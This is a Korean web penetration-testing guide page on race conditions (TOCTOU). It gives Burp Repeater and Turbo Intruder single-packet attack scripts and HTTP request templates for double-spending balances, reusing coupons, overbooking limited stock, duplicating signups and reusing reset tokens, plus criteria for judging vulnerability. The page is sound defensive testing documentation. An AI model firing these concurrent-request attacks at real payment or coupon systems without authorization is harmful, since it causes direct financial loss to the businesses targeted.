---
sidebar_position: 25
title: Race Condition
description: 웹 진단 - Race Condition 점검 절차, Burp Turbo Intruder Single Packet Attack, 결제/쿠폰/포인트 시나리오, PoC
keywords: [Race Condition, TOCTOU, Concurrency, Turbo Intruder, Single Packet Attack, Burp Repeater, Idempotency, OWASP A06]
draft: false
---

# 경쟁 상태
> 검증과 실행 사이의 시간차 (TOCTOU: Time Of Check / Time Of Use) 를 이용해 **한 번만 가능해야 하는 액션을 여러 번** 트리거.
> 결제 / 포인트 / 쿠폰 / 한정 자원 영역에서 단일 결함만으로 직접 금전 손실 / 자원 고갈.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP A06:2025 - Insecure Design / KISA 비즈니스 로직 |
| **CWE** | [CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html), [CWE-367: TOCTOU Race Condition](https://cwe.mitre.org/data/definitions/367.html) |
| **영향도** | 🔴 (결제 / 포인트 / 쿠폰 / 한정 자원) / 🟡 (일반 데이터) |
| **점검 난이도** | 중 (Burp 기본 group send) / 상 (Turbo Intruder Single Packet Attack) |
| **예상 점검 시간** | 1 ~ 4시간 (후보 액션 수에 비례) |

---

## 점검 목적

두 개 이상의 요청이 동시에 처리될 때 **검증 시점과 실행 시점 사이의 시간차** (TOCTOU) 를 이용해 비즈니스 로직을 우회할 수 있는지 확인한다. "한 번만 가능해야 하는" 액션 (결제, 포인트 차감, 쿠폰 사용, 한정 자원 점유) 의 동시 요청 시 검증이 N개 요청 모두에 대해 통과되고 N번 적용되면 직접 금전 손실로 직결.

> **다른 페이지와 영역 분리**
> - 비즈니스 로직 일반 (시퀀스 우회, 가격 변조 등) → `business-logic.md`
> - Mass Assignment → `authorization-idor.md`
> - 인증 흐름 race 의 일부 (MFA / 비밀번호 재설정) 는 `authentication.md` 와 겹침 — 본 페이지는 **동시 요청 관점** 에서

---

## 유형 구분

| 유형 | 핵심 |
| :--- | :--- |
| **금융 로직 race** | 잔액 / 포인트 / 마일리지 동시 차감 (한 잔액으로 여러 결제) |
| **1회성 토큰 / 쿠폰** | 같은 쿠폰 / 1회 사용 코드 동시 적용 → N번 적용됨 |
| **한정 자원 점유** | 좌석 / 수량 한정 상품 / 추첨권 다중 점유 |
| **유니크 제약 우회** | 회원가입 중복 ID / 이메일, 닉네임 중복 |
| **인증 흐름 race** | MFA / 비밀번호 재설정 토큰 검증과 무효화 사이 |
| **상태 전이 race** | "결제대기 → 결제완료" 같은 상태 변경 사이 환불 요청 등 |

---

## 진단 절차

### Step 1. 후보 액션 식별

"한 번만 가능해야 하는" / "유한 자원에 영향을 주는" 액션을 모두 매핑. 우선순위:

```
[금전]   결제, 포인트/마일리지 사용, 쿠폰 적용, 환불 요청, 송금
[자원]   좌석/수량 한정 상품 구매, 추첨 응모, 한정판 응모
[유니크] 회원가입 (이메일/ID), 닉네임 변경, 도메인/슬러그 등록
[인증]   MFA 토큰 사용, 비밀번호 재설정 토큰, 이메일 인증 링크
[상태]   결제 상태 전이, 주문 취소/환불, 권한 변경
[비금전] 친구 추가, 좋아요, 투표, 팔로우 (임팩트 낮음)
```

### Step 2. Burp Repeater group send
Burp 2023.10+ 에서 **Single Packet Attack** (단일 TCP 패킷에 여러 요청 동시 도착) 지원:

```
1. 동일 요청을 Repeater 탭 N개에 복제 (Ctrl+R N번)
2. 탭들을 그룹으로 묶기 (탭 우클릭 → "Add tab to group")
3. 그룹 송신 옵션 선택:
   - "Send group in parallel (single connection)"   ← Single Packet Attack
   - "Send group in parallel (separate connections)"
   - "Send group in sequence (single connection)"
4. 응답 비교 — 모두 200 인지, DB 상태가 어떻게 변했는지 확인
```

기본 시도로 race 가능성이 보이면 Step 3 으로 정밀 측정.

### Step 3. Turbo Intruder 로 정밀 동시 요청

Turbo Intruder (Burp 확장) 는 동시성 정밀 제어 + Single Packet Attack 모두 지원. 20~50 동시 요청 발사로 가장 효과적:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,            # Single Packet Attack 모드
        requestsPerConnection=100,
        engine=Engine.BURP2
    )

    # 30개 요청을 같은 gate 에 묶어 동시 release
    for i in range(30):
        engine.queue(target.req, gate='race1')

    # gate 열기 — 일제히 발사
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Step 4. 영향 입증

API 응답만으로는 부족 — DB 또는 후속 조회 API 로 실제 상태 변화 확인:

- 잔액 / 포인트 잔량 조회 → 음수 또는 비즈니스 로직과 불일치
- 쿠폰 사용 이력 조회 → 1회 쿠폰의 사용 이력이 N건
- 한정 자원 점유 조회 → N개 자원에 N+M 명 점유

---

## 페이로드 / 테스트 케이스

### 케이스 1: 결제 / 잔액 / 포인트 동시 차감

**언제 쓰는지**: 잔액 / 포인트를 차감하는 모든 액션. 점검 우선순위 최상위.

**전제 시나리오:**

```
[전제]   사용자 보유 잔액 5,000원
[액션]   3,000원 결제 요청을 동시에 20개 전송
[취약 결과]   20개 요청 모두 200 OK + 결제 성공 + 최종 잔액 음수 또는 0
[안전 결과]   1개만 성공 + 나머지 19개는 "잔액 부족" 응답
```

**Burp Repeater group send (Single Packet) 또는 Turbo Intruder 로 동시 발사:**

```http
POST /api/payment HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
Content-Type: application/json

{"product_id": 42, "amount": 3000}
```

**판정**: 동시 N개 요청 중 2개 이상 200 OK + 최종 잔액 조회 (`GET /api/account/balance`) 가 음수 또는 비즈니스 로직과 불일치하면 취약. 백엔드가 `SELECT balance` 후 `UPDATE balance = balance - 3000` 으로 처리하면서 둘 사이가 같은 트랜잭션 / 락이 없는 패턴.

### 케이스 2: 쿠폰 / 1회성 토큰 중복 사용

**언제 쓰는지**: 1회 사용 쿠폰, 일회용 할인 코드, 추천인 코드, 일회용 인증 토큰.

**전제 시나리오:**

```
[전제]   1회 사용 가능한 5,000원 할인 쿠폰 발급
[액션]   같은 쿠폰 코드로 50개 주문 요청 동시 전송
[취약 결과]   50개 주문 모두에 쿠폰 적용 → 250,000원 할인
[안전 결과]   1개 주문에만 쿠폰 적용 + 나머지 49개는 "이미 사용된 쿠폰"
```

```http
POST /api/order HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
Content-Type: application/json

{"items": [...], "coupon_code": "WELCOME5000"}
```

**판정**: 응답에 쿠폰 적용된 주문이 1개 초과 또는 후속 쿠폰 사용 이력 조회 시 사용 횟수가 1 초과면 취약. 백엔드가 "쿠폰 사용 여부 SELECT → 사용 처리 UPDATE" 흐름인데 두 단계 사이에 락이 없는 패턴.

### 케이스 3: 한정 자원 다중 점유

**언제 쓰는지**: 좌석 예매, 한정 수량 상품, 추첨권, 한정판 응모.

**전제 시나리오:**

```
[전제]   좌석 1개 또는 한정 상품 1개 남음
[액션]   동일 자원에 대한 점유 요청 100개 동시 전송
[취약 결과]   1개 자원에 N명 점유 성공 (오버부킹)
[안전 결과]   1명만 성공 + 나머지 99명은 "매진"
```

```http
POST /api/booking HTTP/1.1
Host: <TARGET>
Cookie: SESSION=<session>
Content-Type: application/json

{"seat_id": "A12"}
```

**판정**: 동일 자원에 다수가 점유 성공 → 취약. 한정 수량 상품에서 발견 시 직접 금전 손실 (오버부킹 환불 / 사은품 추가 지급 등) 로 직결.

> 운영 환경에서 한정 자원 액션을 동시에 발사할 때는 사전 협의 필수. 진단 후 데이터 복원 협의 포함.

### 케이스 4: 유니크 제약 우회
**언제 쓰는지**: 회원가입 (이메일/ID), 닉네임 변경, 도메인/슬러그 등록 등 유니크해야 하는 필드.

**전제 시나리오:**

```
[전제]   이메일 victim@example.com 으로 가입 시도
[액션]   같은 이메일로 가입 요청 10개 동시 전송
[취약 결과]   같은 이메일로 N개 계정 생성
[안전 결과]   1개만 성공 + 나머지는 "이미 가입된 이메일"
```

```http
POST /api/signup HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"email": "victim@example.com", "password": "...", "name": "..."}
```

**판정**: 같은 이메일로 다수 계정 생성 시 취약. DB 레벨 unique constraint 가 없거나, "SELECT 검증 → INSERT" 사이에 race 발생. 영향: 동일 이메일 계정 다수 생성 → 추천 / 가입 보너스 N회 수령, 식별자 충돌 등.

### 케이스 5: 인증 흐름 race
**언제 쓰는지**: 1회 사용 후 무효화되는 인증 토큰 (이메일 인증 링크, 비밀번호 재설정 토큰, MFA 코드).

**전제 시나리오:**

```
[전제]   비밀번호 재설정 토큰 1개 발급 (1회만 사용 가능)
[액션]   같은 토큰으로 비밀번호 재설정 요청 2개 동시 전송
[취약 결과]   둘 다 성공 → 토큰 1회 사용 정책 우회
[안전 결과]   1개만 성공 + 두 번째는 "토큰 무효"
```

```http
POST /api/password/reset HTTP/1.1
Content-Type: application/json

{"token": "RESET_TOKEN", "new_password": "newPass!"}
```

**판정**: 둘 다 성공 시 취약. 직접 영향은 적지만, MFA bypass / 토큰 재사용 정책 우회 등 인증 흐름 신뢰도 손상 — 다른 결함과 결합 시 임팩트 상향.

### 케이스 6: Turbo Intruder Single Packet Attack 스크립트 예시

**언제 쓰는지**: Burp 기본 group send 로는 race window 가 좁아 재현이 어려울 때. 가장 강력한 도구.

**`coupon_race.py`:**

```python
def queueRequests(target, wordlists):
    # Single Packet Attack: 모든 요청을 같은 TCP 패킷으로 묶어 동시 도착
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        requestsPerConnection=100,
        engine=Engine.BURP2
    )

    # 50개 요청을 같은 gate 로 묶음 (gate 열릴 때까지 대기)
    for i in range(50):
        engine.queue(target.req, gate='race1')

    # 일제히 발사
    engine.openGate('race1')

def handleResponse(req, interesting):
    # 응답 상태/길이를 테이블에 기록 — 200 응답 수 확인
    table.add(req)
```

**Burp 의 Extender → Turbo Intruder → 요청 우클릭 "Send to turbo intruder" → 위 스크립트 붙여넣기 → Attack:**

- 결과 테이블에서 200 응답 개수 확인 → 1개 초과면 race 가능성
- 후속 DB 조회 또는 잔액/쿠폰 이력 API 로 실제 영향 입증

> Turbo Intruder 결과는 응답 코드만으론 판단 부족 — 응답 본문에 "쿠폰 적용됨" 같은 메시지가 N번 나오거나, DB 측 상태가 실제로 N번 변경됐는지 함께 확인.

### 그 외 — 한 줄 언급만
- **친구 추가 / 좋아요 / 투표 / 팔로우** — 비금전 영역. race 가능해도 임팩트 낮음
- **CSRF 토큰 1회용 race** — 동일 토큰 동시 사용 가능 여부. 임팩트 일반적으로 낮음
- **파일 업로드 race** — 검증 후 저장 사이 race 로 차단된 확장자 우회. `file-upload.md` 영역
- **CTF 류 (signal handler, OS 파일 시스템 race)** — 웹 진단 비대상

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약:

- [ ] 동시 N개 요청 중 2개 이상 정상 처리 (200 OK + 실제 적용) 되어야 안 되는 액션
- [ ] DB 상태가 비즈니스 로직과 불일치 (잔액 음수, 쿠폰 N회 적용 등)
- [ ] 한정 자원 N개에 N+M 명 점유
- [ ] 1회성 토큰 (비밀번호 재설정, MFA) 으로 N회 인증 / 적용 성공
- [ ] 유니크 제약 무력화 (중복 계정 / 닉네임 생성)

**오탐 주의:**

- [ ] 동시 N개 요청 중 1개만 성공 + 나머지 실패 → 정상 (락 적용됨)
- [ ] 응답은 200 이지만 실제 DB 변경은 1회만 적용 → 트랜잭션이 작동한 것. **응답 코드만으로 판정 금지**, 반드시 후속 상태 조회로 검증
- [ ] 멱등성 키 (`Idempotency-Key` 헤더) 가 적용된 환경에서 같은 키로 보내 1회만 처리되는 건 정상
- [ ] 한정 자원 / 결제 액션은 사전 협의 필수 — 운영 환경에서 함부로 동시 발사 금지
- [ ] race 윈도우가 매우 좁은 경우 (DB 락이 있지만 짧은 시점 race 가능) 도 있음 — 50~100 동시까지 늘려서 재시도

---

## 참고자료

- [OWASP - Testing for Race Conditions](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Race_Conditions)
- [PortSwigger Research - Smashing the state machine: the true potential of web race conditions (James Kettle)](https://portswigger.net/research/smashing-the-state-machine)
- [PortSwigger - Race conditions](https://portswigger.net/web-security/race-conditions)
- [Turbo Intruder GitHub](https://github.com/PortSwigger/turbo-intruder)
- [HackTricks - Race Condition](https://book.hacktricks.xyz/pentesting-web/race-condition)
- [Stripe Engineering - Designing robust and predictable APIs with idempotency](https://stripe.com/blog/idempotency)
- [Martin Kleppmann - How to do distributed locking](https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html)
